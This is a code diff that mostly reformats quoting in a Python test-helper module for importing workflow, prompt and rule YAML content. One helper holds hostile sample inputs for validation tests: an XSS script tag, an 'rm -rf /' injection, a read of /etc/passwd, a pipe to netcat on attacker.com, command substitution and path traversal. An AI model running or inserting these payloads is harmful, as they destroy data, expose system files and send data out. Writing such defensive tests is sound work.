@@ -25,7 +25,7 @@ def read_mixed_content_file(file_path: Union[str, Path]) -> str:
         IOError: If file can't be read
     """
     path = Path(file_path)
-    return path.read_text(encoding='utf-8')
+    return path.read_text(encoding="utf-8")
 
 
 def split_yaml_documents(content: str) -> List[str]:
@@ -38,12 +38,12 @@ def split_yaml_documents(content: str) -> List[str]:
     """
     # Split on YAML document separators
     documents = []
-    parts = content.split('---')
+    parts = content.split("---")
 
     for part in parts:
         stripped = part.strip()
         # Skip empty parts or parts that are just comments
-        if stripped and not stripped.startswith('#'):
+        if stripped and not stripped.startswith("#"):
             documents.append(stripped)
 
     return documents
@@ -70,9 +70,7 @@ arguments:
  default_value:default-{i}
 """
 
-    return '\n'.join(
-        workflow_template.format(i=i) for i in range(count)
-    )
+    return "\n".join(workflow_template.format(i=i) for i in range(count))
 
 
 def create_large_mangled_content(count: int = 100) -> str:
@@ -90,9 +88,7 @@ tags：[git，test，item{i}
 description：Workflow number {i} with issues
 """
 
-    return '\n---\n'.join(
-        mangled_template.format(i=i) for i in range(count)
-    )
+    return "\n---\n".join(mangled_template.format(i=i) for i in range(count))
 
 
 def validate_output_yaml_files(output_dir: Union[str, Path]) -> List[str]:
@@ -140,35 +136,32 @@ def create_test_content_by_type(content_type: str) -> Dict[str, Any]:
         Dictionary containing test content
     """
     content_templates = {
-        'workflow': {
-            'name': 'Test Workflow',
-            'command': 'echo test',
-            'shells': ['bash'],
-            'description': 'A test workflow'
+        "workflow": {
+            "name": "Test Workflow",
+            "command": "echo test",
+            "shells": ["bash"],
+            "description": "A test workflow",
         },
-        'prompt': {
-            'name': 'Test Prompt',
-            'prompt': 'Please {{action}} the following {{item}}',
-            'arguments': [
-                {'name': 'action', 'description': 'Action to perform'},
-                {'name': 'item', 'description': 'Item to process'}
-            ]
+        "prompt": {
+            "name": "Test Prompt",
+            "prompt": "Please {{action}} the following {{item}}",
+            "arguments": [
+                {"name": "action", "description": "Action to perform"},
+                {"name": "item", "description": "Item to process"},
+            ],
         },
-        'rule': {
-            'title': 'Test Rule',
-            'description': 'A test rule',
-            'guidelines': ['Follow this guideline'],
-            'category': 'testing'
+        "rule": {
+            "title": "Test Rule",
+            "description": "A test rule",
+            "guidelines": ["Follow this guideline"],
+            "category": "testing",
         },
-        'env_var': {
-            'variables': {'TEST_VAR': 'test_value'},
-            'scope': 'user'
+        "env_var": {"variables": {"TEST_VAR": "test_value"}, "scope": "user"},
+        "notebook": {
+            "title": "Test Notebook",
+            "description": "A test notebook",
+            "content": "# Test\n\n```bash\necho test\n```",
         },
-        'notebook': {
-            'title': 'Test Notebook',
-            'description': 'A test notebook',
-            'content': '# Test\n\n```bash\necho test\n```'
-        }
     }
 
     return content_templates.get(content_type, {})
@@ -181,16 +174,16 @@ def create_malicious_content_samples() -> Dict[str, str]:
         Dictionary mapping attack type to malicious content
     """
     return {
-        'script_injection': """
+        "script_injection": """
             name: Evil Workflow
             command: <script>alert('xss')</script>
             description: This contains dangerous content
         """,
-        'command_injection_semicolon': "echo test; rm -rf /",
-        'command_injection_ampersand': "ls && cat /etc/passwd",
-        'command_injection_pipe': "command | nc attacker.com 8080",
-        'command_substitution': "test $(evil_command)",
-        'path_traversal': "path/../../etc/passwd"
+        "command_injection_semicolon": "echo test; rm -rf /",
+        "command_injection_ampersand": "ls && cat /etc/passwd",
+        "command_injection_pipe": "command | nc attacker.com 8080",
+        "command_substitution": "test $(evil_command)",
+        "path_traversal": "path/../../etc/passwd",
     }
 
 
